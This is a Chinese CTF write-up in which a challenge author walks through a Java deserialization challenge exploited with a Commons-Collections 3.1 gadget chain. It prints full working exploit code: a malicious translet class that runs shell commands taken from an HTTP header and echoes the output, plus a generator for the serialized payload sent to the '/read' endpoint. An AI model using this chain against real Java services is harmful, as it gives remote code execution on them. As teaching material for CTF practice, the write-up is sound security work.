---
title: 记一次CTF出题之CC链_WP篇
date: 2024-03-18 18:53:00 +0800
img_path: /
categories: [CTF, CTF出题记录]
tags: [CTF, CTF出题记录]   

---



# WEB-CC链

## 一、查看题目信息

题目给出一个jar包，反编译后查看`Controller`层内容如下：

![image-20240318170411689](assets/image-20240318170411689.png)

`/read`路由下存在反序列化操作。



## 二、题目分析

查看`pom.xml`文件

![image-20240318170456765](assets/image-20240318170456765.png)

注意到存在`commons-collections`依赖，且版本为`3.1`。可使用CC链打反序列化。

`cc`链执行任意命令的链子因为靶场不出网所以无法获取flag，这里就不多赘述，还是以打回显链为目的，可使用加载恶意类的形式实现任意代码执行：

恶意类：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class SpringEcho extends AbstractTranslet {
    static {
        org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
        String[] cmd = System.getProperty("os.name").toLowerCase().contains("windows")? new String[]{"cmd.exe", "/c", httprequest.getHeader("C")} : new String[]{"/bin/sh", "-c", httprequest.getHeader("C")};
        byte[] result = new byte[0];
        try {
            result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        try {
            httpresponse.getWriter().write(new String(result));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        try {
            httpresponse.getWriter().flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        try {
            httpresponse.getWriter().close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

生成`payload`：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CCTemplatesImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz1 = pool.get(SpringEcho.class.getName());
        setFieldValue(obj, "_bytecodes", new byte[][]{clazz1.toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer transformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
        HashMap expMap = new HashMap();
        expMap.put(tme, "key");
        outerMap.remove(obj);
        setFieldValue(transformer, "iMethodName", "newTransformer");
        byte[] obs = serialize(expMap);
        System.out.println(new String(Base64.getEncoder().encode(obs)));
        deserialize(obs);
    }
}

```



## 三、漏洞利用

生成`payload`传入反序列化的点：`?obj=xxxx`，需要注意的是`payload`需要`url编码`。

![image-20240318171642248](assets/image-20240318171642248.png)